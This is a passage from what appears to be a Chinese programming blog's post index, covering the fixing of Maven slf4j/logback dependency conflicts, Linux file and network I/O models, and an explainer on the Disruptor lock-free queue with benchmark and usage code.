&lt;version&gt;11.2.0.1.0&lt;&#x2F;version&gt; &lt;&#x2F;dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.projectlombok&lt;&#x2F;groupId&gt; &lt;artifactId&gt;lombok&lt;&#x2F;artifactId&gt; &lt;optional&gt;true&lt;&#x2F;optional&gt; &lt;&#x2F;dependency&gt;&lt;!-- &lt;dependency&gt;--&gt;&lt;!-- &lt;groupId&gt;com.alibaba.boot&lt;&#x2F;groupId&gt;--&gt;&lt;!-- &lt;artifactId&gt;nacos-discovery-spring-boot-starter&lt;&#x2F;artifactId&gt;--&gt;&lt;!-- &lt;version&gt;0.2.4&lt;&#x2F;version&gt;--&gt;&lt;!-- &lt;&#x2F;dependency&gt;--&gt; &lt;&#x2F;dependencies&gt; 运行项目会出现一下冲突： 这里提示org-slf4j 冲突； 使用mvn dependency:tree 查看依赖树： 1复制mvn dependency:tree &gt; tree.txt tree.txt:(信息比较多，就截取一点。) 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748复制[INFO] com.nari:bgservice-task:jar:1.2.1[INFO] +- org.springframework.boot:spring-boot-starter-data-redis-reactive:jar:2.0.4.RELEASE:compile[INFO] | \\- org.springframework.boot:spring-boot-starter-data-redis:jar:2.0.4.RELEASE:compile[INFO] | +- org.springframework.data:spring-data-redis:jar:2.0.9.RELEASE:compile[INFO] | | +- org.springframework.data:spring-data-keyvalue:jar:2.0.9.RELEASE:compile[INFO] | | \\- org.springframework:spring-oxm:jar:5.0.8.RELEASE:compile[INFO] | \\- io.lettuce:lettuce-core:jar:5.0.4.RELEASE:compile[INFO] | \\- io.projectreactor:reactor-core:jar:3.1.8.RELEASE:compile[INFO] | \\- org.reactivestreams:reactive-streams:jar:1.0.2:compile[INFO] +- org.springframework.boot:spring-boot-starter-quartz:jar:2.0.4.RELEASE:compile[INFO] | +- org.springframework.boot:spring-boot-starter:jar:2.0.4.RELEASE:compile[INFO] | | +- org.springframework.boot:spring-boot:jar:2.0.4.RELEASE:compile[INFO] | | +- org.springframework.boot:spring-boot-autoconfigure:jar:2.0.4.RELEASE:compile[INFO] | | +- org.springframework.boot:spring-boot-starter-logging:jar:2.0.4.RELEASE:compile[INFO] | | | +- ch.qos.logback:logback-classic:jar:1.2.3:compile[INFO] | | | | \\- ch.qos.logback:logback-core:jar:1.2.3:compile[INFO] | | | +- org.apache.logging.log4j:log4j-to-slf4j:jar:2.10.0:compile[INFO] | | | | \\- org.apache.logging.log4j:log4j-api:jar:2.10.0:compile[INFO] | | | \\- org.slf4j:jul-to-slf4j:jar:1.7.25:compile[INFO] | | +- javax.annotation:javax.annotation-api:jar:1.3.2:compile[INFO] | | +- org.springframework:spring-core:jar:5.0.8.RELEASE:compile[INFO] | | | \\- org.springframework:spring-jcl:jar:5.0.8.RELEASE:compile[INFO] | | \\- org.yaml:snakeyaml:jar:1.19:runtime[INFO] | +- org.springframework:spring-context-support:jar:5.0.8.RELEASE:compile[INFO] | | +- org.springframework:spring-beans:jar:5.0.8.RELEASE:compile[INFO] | | \\- org.springframework:spring-context:jar:5.0.8.RELEASE:compile[INFO] | | \\- org.springframework:spring-expression:jar:5.0.8.RELEASE:compile[INFO] | +- org.springframework:spring-tx:jar:5.0.8.RELEASE:compile[INFO] | \\- org.quartz-scheduler:quartz:jar:2.3.0:compile[INFO] | \\- com.mchange:mchange-commons-java:jar:0.2.11:compile[INFO] +- org.springframework.boot:spring-boot-starter-data-jpa:jar:2.0.4.RELEASE:compile[INFO] | +- org.springframework.boot:spring-boot-starter-aop:jar:2.0.4.RELEASE:compile[INFO] | | +- org.springframework:spring-aop:jar:5.0.8.RELEASE:compile[INFO] | | \\- org.aspectj:aspectjweaver:jar:1.8.13:compile[INFO] | +- org.springframework.boot:spring-boot-starter-jdbc:jar:2.0.4.RELEASE:compile[INFO] | | +- com.zaxxer:HikariCP:jar:2.7.9:compile[INFO] | | \\- org.springframework:spring-jdbc:jar:5.0.8.RELEASE:compile[INFO] | +- org.hibernate:hibernate-core:jar:5.2.17.Final:compile[INFO] | | +- org.jboss.logging:jboss-logging:jar:3.3.2.Final:compile[INFO] | | +- org.hibernate.javax.persistence:hibernate-jpa-2.1-api:jar:1.0.2.Final:compile[INFO] | | +- org.javassist:javassist:jar:3.22.0-GA:compile[INFO] | | +- antlr:antlr:jar:2.7.7:compile[INFO] | | +- org.jboss:jandex:jar:2.0.3.Final:compile[INFO] | | +- com.fasterxml:classmate:jar:1.3.4:compile[INFO] | | +- dom4j:dom4j:jar:1.6.1:compile[INFO] | | \\- org.hibernate.common:hibernate-commons-..... 看到这里发现不是方便查找需要的jar包，这里可以使用mvn dependency:tree -Dincludes 限制； 1复制mvn dependency:tree -Dincludes&#x3D;org.slf4j 从图中发现org-slf4j的版本是一样的，先不管这个，先排除所有试试； 123456789101112131415复制&lt;dependency&gt; &lt;groupId&gt;org.apache.zookeeper&lt;&#x2F;groupId&gt; &lt;artifactId&gt;zookeeper&lt;&#x2F;artifactId&gt; &lt;version&gt;3.5.6&lt;&#x2F;version&gt; &lt;exclusions&gt; &lt;exclusion&gt; &lt;groupId&gt;org.slf4j&lt;&#x2F;groupId&gt; &lt;artifactId&gt;slf4j-log4j12&lt;&#x2F;artifactId&gt; &lt;&#x2F;exclusion&gt; &lt;exclusion&gt; &lt;groupId&gt;log4j&lt;&#x2F;groupId&gt; &lt;artifactId&gt;log4j&lt;&#x2F;artifactId&gt; &lt;&#x2F;exclusion&gt; &lt;&#x2F;exclusions&gt; &lt;&#x2F;dependency&gt; 再次运行 如果发现依然报错： 再次寻找冲突问题： 这次把焦点放在logback上； 执行 1复制mvn dependency:tree -Dverbose -Dincludes&#x3D;ch.qos.logback 发现这个logback 1.2.3的包，将其排除： 12345678910复制&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;&#x2F;groupId&gt; &lt;artifactId&gt;spring-boot-starter-quartz&lt;&#x2F;artifactId&gt; &lt;exclusions&gt; &lt;exclusion&gt; &lt;groupId&gt;ch.qos.logback&lt;&#x2F;groupId&gt; &lt;artifactId&gt;logback-classic&lt;&#x2F;artifactId&gt; &lt;&#x2F;exclusion&gt; &lt;&#x2F;exclusions&gt; &lt;&#x2F;dependency&gt; 此次运行将正常运行不在报jar报冲突；； 处理jar冲突： 简介:处理jar包依赖冲突,首先,对于多个jar包都引用同一jar包的情况,最好是在程序中显式定义被共同引用的jar包的依赖,来统一版本号,方便维护 如果A和B都依赖同一jar包C,可能会出现两种情况 1.A和B引用的C版本相同,这时按照pom定义顺序选择第一个即可,没有冲突问题,如果在项目的maven中显示定义了C依赖,那么用选择项目定义的依赖,反正version都一样,没有影响 2.A和B依赖的C版本不同,选择版本高的那个,这时会出现两种结果 (1) 高版本兼容低版本,所以不会出现问题 (2)高版本不兼容低版本,假如A依赖C2版本,B依赖C3版本,C3不兼容C2,maven选择了高版本C3,对A来说会出现问题 有3种解决方法 [1]提升A版本,找到依赖C3的A版本 [2]如果B版本也可依赖C2,在项目的maven中显示定义对C2的依赖,这样所有都使用C2版本 [3]如果B版本不支持C2版本,只能降低B版本,找到依赖C2的B版本 从功能性和可维护性考虑,高版本提供的功能更多,bug更少,优先考虑1 再考虑2 最后考虑3 作者: MysticalYcc","categories":[{"name":"java","slug":"java","permalink":"https://gschaos.club/categories/java/"}],"tags":[{"name":"java","slug":"java","permalink":"https://gschaos.club/tags/java/"}]},{"title":"操作系统+网络","slug":"some books for me","date":"2020-03-03T16:00:00.000Z","updated":"2020-10-25T08:27:26.000Z","comments":true,"path":"some books for me/","link":"","permalink":"https://gschaos.club/some%20books%20for%20me/","excerpt":"最近在读一本&lt;&lt;软件架构设计:大型网站技术架构与业务融合之道&gt;&gt;,它就像是把你平时一点点积累的知识有条理且有深度的整合。一步一步的将读者断断续续的知识接起来。以下文章是记录书本中的一些知识并加以拓展。","text":"最近在读一本&lt;&lt;软件架构设计:大型网站技术架构与业务融合之道&gt;&gt;,它就像是把你平时一点点积累的知识有条理且有深度的整合。一步一步的将读者断断续续的知识接起来。以下文章是记录书本中的一些知识并加以拓展。 操作系统对于开发者来说，I/O 是绕不过去的一个基本问题。从文件 I/O 到网络 I/O，存在着各式各样的概念和 I/O 模型，所以这里首先把涉及 I/O 的各种概念和原理厘清。 IO先了解几个概念； 应用程序内存：是通常写代码用 malloc/free、new/delete 等分配出来的内存。 用户缓冲区：C 语言的 FILE 结构体里面的 buffer。FILE 结构体的定义如下，可以看到里面有定义的 buffer； 内核缓冲区：Linux 操作系统的 Page Cache。为了加快磁盘的 I/O，Linux 系统会把磁盘上的数据以 Page 为单位缓存在操作系统的内存里，这里的 Page 是 Linux 系统定义的一个逻辑概念，一个 Page 一般为 4K。 缓存 I/O (Buffered I/O)/直接IO缓存 I/O 又被称作标准 I/O，大多数文件系统的默认 I/O 操作都是缓存 I/O。在 Linux 的缓存 I/O 机制中，操作系统会将 I/O 的数据缓存在文件系统的页缓存（ page cache ）中，也就是说，数据会先被拷贝到操作系统内核的缓冲区中，然后才会从操作系统内核的缓冲区拷贝到应用程序的地址空间。缓存 I/O 有以下这些优点： 缓存 I/O 使用了操作系统内核缓冲区，在一定程度上分离了应用程序空间和实际的物理设备。 缓存 I/O 可以减少读盘的次数，从而提高性能。 当应用程序尝试读取某块数据的时候，如果这块数据已经存放在了页缓存中，那么这块数据就可以立即返回给应用程序，而不需要经过实际的物理读盘操作。当然，如果数据在应用程序读取之前并未被存放在页缓存中，那么就需要先将数据从磁盘读到页缓存中去。对于写操作来说，应用程序也会将数据先写到页缓存中去，数据是否被立即写到磁盘上去取决于应用程序所采用的写操作机制：如果用户采用的是同步写机制（ synchronous writes ）, 那么数据会立即被写回到磁盘上，应用程序会一直等到数据被写完为止；如果用户采用的是延迟写机制（ deferred writes ），那么应用程序就完全不需要等到数据全部被写回到磁盘，数据只要被写到页缓存中去就可以了。在延迟写机制的情况下，操作系统会定期地将放在页缓存中的数据刷到磁盘上。与异步写机制（ asynchronous writes ）不同的是，延迟写机制在数据完全写到磁盘上的时候不会通知应用程序，而异步写机制在数据完全写到磁盘上的时候是会返回给应用程序的。所以延迟写机制本身是存在数据丢失的风险的，而异步写机制则不会有这方面的担心。 在缓存 I/O 机制中，DMA 方式可以将数据直接从磁盘读到页缓存中，或者将数据从页缓存直接写回到磁盘上，而不能直接在应用程序地址空间和磁盘之间进行数据传输，这样的话，数据在传输过程中需要在应用程序地址空间和页缓存之间进行多次数据拷贝操作，这些数据拷贝操作所带来的 CPU 以及内存开销是非常大的。 对于某些特殊的应用程序来说，避开操作系统内核缓冲区而直接在应用程序地址空间和磁盘之间传输数据会比使用操作系统内核缓冲区获取更好的性能，下边这一小节中提到的自缓存应用程序就是其中的一种。 标准访问文件的方式 在 Linux 中，这种访问文件的方式是通过两个系统调用实现的：read() 和 write()。当应用程序调用 read() 系统调用读取一块数据的时候，如果该块数据已经在内存中了，那么就直接从内存中读出该数据并返回给应用程序；如果该块数据不在内存中，那么数据会被从磁盘上读到页高缓存中去，然后再从页缓存中拷贝到用户地址空间中去。如果一个进程读取某个文件，那么其他进程就都不可以读取或者更改该文件；对于写数据操作来说，当一个进程调用了 write() 系统调用往某个文件中写数据的时候，数据会先从用户地址空间拷贝到操作系统内核地址空间的页缓存中去，然后才被写到磁盘上。但是对于这种标准的访问文件的方式来说，在数据被写到页缓存中的时候，write() 系统调用就算执行完成，并不会等数据完全写入到磁盘上。Linux 在这里采用的是我们前边提到的延迟写机制（ deferred writes ）。 同步访问文件的方式 同步访问文件的方式与上边这种标准的访问文件的方式比较类似，这两种方法一个很关键的区别就是：同步访问文件的时候，写数据的操作是在数据完全被写回磁盘上才算完成的；而标准访问文件方式的写数据操作是在数据被写到页高速缓冲存储器中的时候就算执行完成了。 内存映射方式 在很多操作系统包括 Linux 中，内存区域（ memory region ）是可以跟一个普通的文件或者块设备文件的某一个部分关联起来的，若进程要访问内存页中某个字节的数据，操作系统就会将访问该内存区域的操作转换为相应的访问文件的某个字节的操作。Linux 中提供了系统调用 mmap() 来实现这种文件访问方式。与标准的访问文件的方式相比，内存映射方式可以减少标准访问文件方式中 read() 系统调用所带来的数据拷贝操作，即减少数据在用户地址空间和操作系统内核地址空间之间的拷贝操作。映射通常适用于较大范围，对于相同长度的数据来讲，映射所带来的开销远远低于 CPU 拷贝所带来的开销。当大量数据需要传输的时候，采用内存映射方式去访问文件会获得比较好的效率。 直接 I/O 方式 凡是通过直接 I/O 方式进行数据传输，数据均直接在用户地址空间的缓冲区和磁盘之间直接进行传输，完全不需要页缓存的支持。操作系统层提供的缓存往往会使应用程序在读写数据的时候获得更好的性能，但是对于某些特殊的应用程序，比如说数据库管理系统这类应用，他们更倾向于选择他们自己的缓存机制，因为数据库管理系统往往比操作系统更了解数据库中存放的数据，数据库管理系统可以提供一种更加有效的缓存机制来提高数据库中数据的存取性能。 零拷贝零拷贝的意思是说不需要将数据从某处复制到特定的某一个区域，可以减少CPU在数据复制的消耗还有内存内存带宽。 它马的发现自己说不清楚，大家去这个网站认真看吧！！ 详见：https://juejin.im/post/5d84bd1f6fb9a06b2d780df7 网络IOIO模型第一种模型：同步阻塞 I/O。 这种很简单，就是 Linux 系统的 read 和 write 函数，在调用的时候会被阻塞，直到数据读取完成，或者写入成功。 第二种模型：同步非阻塞 I/O。 和同步阻塞 I/O 的 API 是一样的，只是打开 fd 的时候带有 O_NONBLOCK 参数。于是，当调用 read 和 write 函数的时候，如果没有准备好数据，会理解返回，不会阻塞，然后让应用程序不断地去轮询。 第三种模型：I/O 多路复用（IO Multiplexing）。 前面两种 I/O 都只能用于简单的客户端开发。但对于服务器程序来说，需要处理很多的 fd （连接数可以达几十万甚至百万）。如果使用同步阻塞 I/O，要处理这么多的 fd 需要开非常多的线程，每个线程处理一个 fd；如果用同步非阻塞 I/O，要应用程序轮询这么大规模的 fd。这两种办法都不行，所以就有了 I/O 多路复用。 在 Linux 系统中，有三种 I/O 多路复用的办法：select、poll、epoll， I/O 多路复用是现在 Linux 系统上最成熟的网络 I/O 模型，在三种方式中，epoll 的效率最高，所以目前主流的网络模型都是 epoll。 第四种模型：异步 I/O。 熟悉 Windows 系统开发的人会知道 Windows 系统的 IOCP，这是一种真正意义上的异步 I/O。所谓异步 I/O，是指读写都是由操作系统完成的，然后通过回调函数或者某种其他通信机制通知应用程序。 在 Linux 系统上，也有异步 I/O 的实现，就是 aio。但由于 aio 并不成熟，所以现在主要还是用 epoll。 Reactor 模式与 Preactor 模式（1）Reactor 模式：主动模式。所谓主动，是指应用程序不断地轮询，询问操作系统或者网络框架、I/O 是否就绪。Linux 系统下的 select、poll、epoll 就属于主动模式，需要应用程序中有一个循环一直轮询；Java 中的 NIO 也属于这种模式。在这种模式下，实际的 I/O 操作还是应用程序执行的。 （2）Proactor 模式：被动模式。应用程序把 read 和 write 函数操作全部交给操作系统或者网络框架，实际的 I/O 操作由操作系统或网络框架完成，之后再回调应用程序。asio 库就是典型的 Proactor 模式。 参考： Linux 中直接 I/O 机制的介绍 《软件架构设计:大型网站技术架构与业务融合之道》 深入剖析Linux IO原理","categories":[{"name":"架构","slug":"架构","permalink":"https://gschaos.club/categories/%E6%9E%B6%E6%9E%84/"}],"tags":[]},{"title":"Disruptor","slug":"Disruptor","date":"2020-02-02T16:00:00.000Z","updated":"2020-10-25T08:23:36.000Z","comments":true,"path":"Disruptor/","link":"","permalink":"https://gschaos.club/Disruptor/","excerpt":"应该知道的高性能无锁队列Disruptor;","text":"应该知道的高性能无锁队列Disruptor; 你应该知道的高性能无锁队列Disruptor 作者：咖啡拿铁链接：https://juejin.im/post/5b5f10d65188251ad06b78e3 1.何为队列听到队列相信大家对其并不陌生，在我们现实生活中队列随处可见，去超市结账，你会看见大家都会一排排的站得好好的，等待结账，为什么要站得一排排的，你想象一下大家都没有素质，一窝蜂的上去结账，不仅让这个超市崩溃，还会容易造成各种踩踏事件，当然这些事其实在我们现实中也是会经常发生。 当然在计算机世界中，队列是属于一种数据结构，队列采用的FIFO(first in firstout)，新元素（等待进入队列的元素）总是被插入到尾部，而读取的时候总是从头部开始读取。在计算中队列一般用来做排队(如线程池的等待排队，锁的等待排队)，用来做解耦（生产者消费者模式），异步等等。 2.jdk中的队列在jdk中的队列都实现了java.util.Queue接口，在队列中又分为两类，一类是线程不安全的，ArrayDeque，LinkedList等等，还有一类都在java.util.concurrent包下属于线程安全，而在我们真实的环境中，我们的机器都是属于多线程，当多线程对同一个队列进行排队操作的时候，如果使用线程不安全会出现，覆盖数据，数据丢失等无法预测的事情，所以我们这个时候只能选择线程安全的队列。在jdk中提供的线程安全的队列下面简单列举部分队列: 队列名字 是否加锁 数据结构 关键技术点 是否有锁 是否有界 ArrayBlockingQueue 是 数组array ReentrantLock 有锁 有界 LinkedBlockingQueue 是 链表 ReentrantLock 有锁 有界 LinkedTransferQueue 否 链表 CAS 无锁 无界 ConcurrentLinkedQueue 否 链表 CAS 无锁 无界 我们可以看见，我们无锁的队列是无界的，有锁的队列是有界的，这里就会涉及到一个问题，我们在真正的线上环境中，无界的队列，对我们系统的影响比较大，有可能会导致我们内存直接溢出，所以我们首先得排除无界队列，当然并不是无界队列就没用了，只是在某些场景下得排除。其次还剩下ArrayBlockingQueue，LinkedBlockingQueue两个队列，他们两个都是用ReentrantLock控制的线程安全，他们两个的区别一个是数组，一个是链表，在队列中，一般获取这个队列元素之后紧接着会获取下一个元素，或者一次获取多个队列元素都有可能，而数组在内存中地址是连续的，在操作系统中会有缓存的优化(下面也会介绍缓存行)，所以访问的速度会略胜一筹，我们也会尽量去选择ArrayBlockingQueue。而事实证明在很多第三方的框架中，比如早期的log4j异步，都是选择的ArrayBlockingQueue。 当然ArrayBlockingQueue，也有自己的弊端，就是性能比较低，为什么jdk会增加一些无锁的队列，其实就是为了增加性能，很苦恼，又需要无锁，又需要有界，这个时候恐怕会忍不住说一句你咋不上天呢？但是还真有人上天了。 3.DisruptorDisruptor就是上面说的那个天，Disruptor是英国外汇交易公司LMAX开发的一个高性能队列，并且是一个开源的并发框架，并获得2011Duke’s程序框架创新奖。能够在无锁的情况下实现网络的Queue并发操作，基于Disruptor开发的系统单线程能支撑每秒600万订单。目前，包括Apache Storm、Camel、Log4j2等等知名的框架都在内部集成了Disruptor用来替代jdk的队列，以此来获得高性能。 3.1为什么这么牛逼？上面已经把Disruptor吹出了花了，你肯定会产生疑问，他真的能有这么牛逼吗，我的回答是当然的，在Disruptor中有三大杀器: CAS 消除伪共享 RingBuffer 有了这三大杀器，Disruptor才变得如此牛逼。 3.1.1锁和CAS我们ArrayBlockingQueue为什么会被抛弃的一点，就是因为用了重量级lock锁，在我们加锁过程中我们会把锁挂起，解锁后，又会把线程恢复,这一过程会有一定的开销，并且我们一旦没有获取锁，这个线程就只能一直等待，这个线程什么事也不能做。 CAS（compare and swap），顾名思义先比较在交换，一般是比较是否是老的值，如果是的进行交换设置，大家熟悉乐观锁的人都知道CAS可以用来实现乐观锁，CAS中没有线程的上下文切换，减少了不必要的开销。 这里使用JMH，用两个线程，每次1一次调用，在我本机上进行测试，代码如下: 1234567891011121314151617181920212223242526@BenchmarkMode(&#123;Mode.SampleTime&#125;)@OutputTimeUnit(TimeUnit.MILLISECONDS)@Warmup(iterations=3, time = 5, timeUnit = TimeUnit.MILLISECONDS)@Measurement(iterations=1,batchSize = 100000000)@Threads(2)@Fork(1)@State(Scope.Benchmark)public class Myclass &#123; Lock lock = new ReentrantLock(); long i = 0; AtomicLong atomicLong = new AtomicLong(0); @Benchmark public void measureLock() &#123; lock.lock(); i++; lock.unlock(); &#125; @Benchmark public void measureCAS() &#123; atomicLong.incrementAndGet(); &#125; @Benchmark public void measureNoLock() &#123; i++; &#125;&#125; 测试出来结果如下: 测试项目 测试结果 Lock 26000ms CAS 4840ms 无锁 197ms 可以看见Lock是五位数，CAS是四位数，无锁更小是三位数。 由此我们可以知道Lock&gt;CAS&gt;无锁。 而我们的Disruptor中使用的就是CAS，他利用CAS进行队列中的一些下标设置，减少了锁的冲突，提高了性能。 另外对于jdk中其他的无锁队列也是使用CAS，原子类也是使用CAS。 3.1.2伪共享谈到了伪共享就不得不说计算机CPU缓存,缓存大小是CPU的重要指标之一，而且缓存的结构和大小对CPU速度的影响非常大，CPU内缓存的运行频率极高，一般是和处理器同频运作，工作效率远远大于系统内存和硬盘。实际工作时，CPU往往需要重复读取同样的数据块，而缓存容量的增大，可以大幅度提升CPU内部读取数据的命中率，而不用再到内存或者硬盘上寻找，以此提高系统性能。但是从CPU芯片面积和成本的因素来考虑，缓存都很小。 CPU缓存可以分为一级缓存，二级缓存，如今主流CPU还有三级缓存，甚至有些CPU还有四级缓存。每一级缓存中所储存的全部数据都是下一级缓存的一部分，这三种缓存的技术难度和制造成本是相对递减的，所以其容量也是相对递增的。 为什么CPU会有L1、L2、L3这样的缓存设计？主要是因为现在的处理器太快了，而从内存中读取数据实在太慢（一个是因为内存本身速度不够，另一个是因为它离CPU太远了，总的来说需要让CPU等待几十甚至几百个时钟周期），这个时候为了保证CPU的速度，就需要延迟更小速度更快的内存提供帮助，而这就是缓存。对这个感兴趣可以把电脑CPU拆下来，自己把玩一下。 每一次你听见intel发布新的cpu什么,比如i7-7700k,8700k，都会对cpu缓存大小进行优化，感兴趣可以自行下来搜索，这些的发布会或者发布文章。 Martin和Mike的 QConpresentation演讲中给出了一些每个缓存时间： 从CPU到 大约需要的CPU周期 大约需要的时间 主存 约60-80纳秒 QPI 总线传输(between sockets, not drawn) 约20ns L3 cache 约40-45 cycles 约15ns L2 cache 约10 cycles 约3ns L1 cache 约3-4 cycles 约1ns 寄存器 1 cycle 缓存行在cpu的多级缓存中，并不是以独立的项来保存的，而是类似一种pageCahe的一种策略，以缓存行来保存，而缓存行的大小通常是64字节，在Java中Long是8个字节，所以可以存储8个Long,举个例子，你访问一个long的变量的时候，他会把帮助再加载7个，我们上面说为什么选择数组不选择链表，也就是这个原因，在数组中可以依靠缓冲行得到很快的访问。 缓存行是万能的吗？NO，因为他依然带来了一个缺点，我在这里举个例子说明这个缺点，可以想象有个数组队列，ArrayQueue，他的数据结构如下: 1234class ArrayQueue&#123; long maxSize; long currentIndex;&#125; 对于maxSize是我们一开始就定义好的，数组的大小，对于currentIndex，是标志我们当前队列的位置，这个变化比较快，可以想象你访问maxSize的时候，是不是把currentIndex也加载进来了，这个时候，其他线程更新currentIndex,就会把cpu中的缓存行置位无效，请注意这是CPU规定的，他并不是只吧currentIndex置位无效，如果此时又继续访问maxSize他依然得继续从内存中读取，但是MaxSize却是我们一开始定义好的，我们应该访问缓存即可，但是却被我们经常改变的currentIndex所影响。 Padding的魔法为了解决上面缓存行出现的问题，在Disruptor中采用了Padding的方式， 123456789101112131415class LhsPadding&#123; protected long p1, p2, p3, p4, p5, p6, p7;&#125;class Value extends LhsPadding&#123; protected volatile long value;&#125;class RhsPadding extends Value&#123; protected long p9, p10, p11, p12, p13, p14, p15;&#125;复制代码 其中的Value就被其他一些无用的long变量给填充了。这样你修改Value的时候，就不会影响到其他变量的缓存行。 最后顺便一提，在jdk8中提供了@Contended的注解，当然一般来说只允许Jdk中内部，如果你自己使用那就得配置Jvm参数 -RestricContentended = fase，将限制这个注解置位取消。很多文章分析了ConcurrentHashMap，但是都把这个注解给忽略掉了，在ConcurrentHashMap中就使用了这个注解，在ConcurrentHashMap每个桶都是单独的用计数器去做计算，而这个计数器由于时刻都在变化，所以被用这个注解进行填充缓存行优化，以此来增加性能。 3.1.3RingBuffer在Disruptor中采用了数组的方式保存了我们的数据，上面我们也介绍了采用数组保存我们访问时很好的利用缓存，但是在Disruptor中进一步选择采用了环形数组进行保存数据，也就是RingBuffer。在这里先说明一下环形数组并不是真正的环形数组，在RingBuffer中是采用取余的方式进行访问的，比如数组大小为 10，0访问的是数组下标为0这个位置，其实10，20等访问的也是数组的下标为0的这个位置。 实际上，在这些框架中取余并不是使用%运算，都是使用的&amp;与运算，这就要求你设置的大小一般是2的N次方也就是，10,100,1000等等，这样减去1的话就是，1，11，111，就能很好的使用index &amp; (size -1),这样利用位运算就增加了访问速度。 如果在Disruptor中你不用2的N次方进行大小设置，他会抛出buffersize必须为2的N次方异常。 当然其不仅解决了数组快速访问的问题，也解决了不需要再次分配内存的问题，减少了垃圾回收，因为我们0，10，20等都是执行的同一片内存区域，这样就不需要再次分配内存，频繁的被JVM垃圾回收器回收。 自此三大杀器已经说完了，有了这三大杀器为Disruptor如此高性能垫定了基础。接下来还会在讲解如何使用Disruptor和Disruptor的具体的工作原理。 3.2Disruptor怎么使用下面举了一个简单的例子: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465ublic static void main(String[] args) throws Exception &#123; // 队列中的元素 class Element &#123; @Contended private String value; public String getValue() &#123; return value; &#125; public void setValue(String value) &#123; this.value = value; &#125; &#125; // 生产者的线程工厂 ThreadFactory threadFactory = new ThreadFactory() &#123; int i = 0; @Override public Thread newThread(Runnable r) &#123; return new Thread(r, &quot;simpleThread&quot; + String.valueOf(i++)); &#125; &#125;; // RingBuffer生产工厂,初始化RingBuffer的时候使用 EventFactory&lt;Element&gt; factory = new EventFactory&lt;Element&gt;() &#123; @Override public Element newInstance() &#123; return new Element(); &#125; &#125;; // 处理Event的handler EventHandler&lt;Element&gt; handler = new EventHandler&lt;Element&gt;() &#123; @Override public void onEvent(Element element, long sequence, boolean endOfBatch) throws InterruptedException &#123; System.out.println(&quot;Element: &quot; + Thread.currentThread().getName() + &quot;: &quot; + element.getValue() + &quot;: &quot; + sequence);// Thread.sleep(10000000); &#125; &#125;; // 阻塞策略 BlockingWaitStrategy strategy = new BlockingWaitStrategy(); // 指定RingBuffer的大小 int bufferSize = 8; // 创建disruptor，采用单生产者模式 Disruptor&lt;Element&gt; disruptor = new Disruptor(factory, bufferSize, threadFactory, ProducerType.SINGLE, strategy); // 设置EventHandler disruptor.handleEventsWith(handler); // 启动disruptor的线程 disruptor.start(); for (int i = 0; i &lt; 10; i++) &#123; disruptor.publishEvent((element, sequence) -&gt; &#123; System.out.println(&quot;之前的数据&quot; + element.getValue() + &quot;当前的sequence&quot; + sequence); element.setValue(&quot;我是第&quot; + sequence + &quot;个&quot;); &#125;); &#125; &#125; 在Disruptor中有几个比较关键的: ThreadFactory：这是一个线程工厂，用于我们Disruptor中生产者消费的时候需要的线程。 EventFactory：事件工厂，用于产生我们队列元素的工厂，在Disruptor中，他会在初始化的时候直接填充满RingBuffer，一次到位。 EventHandler：用于处理Event的handler，这里一个EventHandler可以看做是一个消费者，但是多个EventHandler他们都是独立消费的队列。 WorkHandler:也是用于处理Event的handler，和上面区别在于，多个消费者都是共享同一个队列。 WaitStrategy：等待策略，在Disruptor中有多种策略，来决定消费者获消费时，如果没有数据采取的策略是什么？下面简单列举一下Disruptor中的部分策略 BlockingWaitStrategy：通过线程阻塞的方式，等待生产者唤醒，被唤醒后，再循环检查依赖的sequence是否已经消费。 BusySpinWaitStrategy：线程一直自旋等待，可能比较耗cpu LiteBlockingWaitStrategy：线程阻塞等待生产者唤醒，与BlockingWaitStrategy相比，区别在signalNeeded.getAndSet,如果两个线程同时访问一个访问waitfor,一个访问signalAll时，可以减少lock加锁次数. LiteTimeoutBlockingWaitStrategy：与LiteBlockingWaitStrategy相比，设置了阻塞时间，超过时间后抛异常。 YieldingWaitStrategy：尝试100次，然后Thread.yield()让出cpu EventTranslator:实现这个接口可以将我们的其他数据结构转换为在Disruptor中流通的Event。 3.3工作原理上面已经介绍了CAS，减少伪共享,RingBuffer三大杀器，介绍下来说一下Disruptor中生产者和消费者的整个流程。 3.3.1生产者对于生产者来说，可以分为多生产者和单生产者，用ProducerType.Single,和ProducerType.MULTI区分，多生产者和单生产者来说多了CAS，因为单生产者由于是单线程，所以不需要保证线程安全。 在disruptor中通常用disruptor.publishEvent和disruptor.publishEvents()进行单发和群发。 在disruptor发布一个事件进入队列需要下面几个步骤: 首先获取RingBuffer中下一个在RingBuffer上可以发布的位置，这个可以分为两类: 从来没有写过的位置 已经被所有消费者读过，可以在写的位置。 如果没有读取到会一直尝试去读，disruptor做的很巧妙，并没有一直占据CPU，而是通过LockSuport.park()，进行了一下将线程阻塞挂起操作，为的是不让CPU一直进行这种空循环，不然其他线程都抢不到CPU时间片。 获取位置之后会进行cas进行抢占，如果是单线程就不需要。 接下来调用我们上面所介绍的EventTranslator将第一步中RingBuffer中那个位置的event交给EventTranslator进行重写。 进行发布，在disruptor还有一个额外的数组用来记录当前ringBuffer所在位置目前最新的序列号是多少，拿上面那个0，10，20举例，写到10的时候这个avliableBuffer就在对应的位置上记录目前这个是属于10，有什么用呢后面会介绍。进行发布的时候需要更新这个avliableBuffer，然后进行唤醒所有阻塞的生产者。 下面简单画一下流程，上面我们拿10举例是不对的，因为bufferSize必须要2的N次方，所以我们这里拿Buffersize=8来举例:下面介绍了当我们已经push了8个event也就是一圈的时候，接下来再push 3条消息的一些过程: 1.首先调用next(3)，我们当前在7这个位置上所以接下来三条是8，9，10，取余也就是0，1，2。 2.重写0，1，2这三个内存区域的数据。 3.写avaliableBuffer。 对了不知道大家对上述流程是不是很熟悉呢，对的那就是类似我们的2PC，两阶段提交，先进行RingBuffer的位置锁定，然后在进行提交和通知消费者。具体2PC的介绍可以参照我的另外一篇文章再有人问你分布式事务，给他看这篇文章。 3.3.1消费者对于消费者来说，上面介绍了分为两种，一种是多个消费者独立消费，一种是多个消费者消费同一个队列，这里介绍一下较为复杂的多个消费者消费同一个队列，能理解这个也就能理解独立消费。 在我们的disruptor.strat()方法中会启动我们的消费者线程以此来进行后台消费。在消费者中有两个队列需要我们关注，一个是所有消费者共享的进度队列，还有个是每个消费者独立消费进度队列。 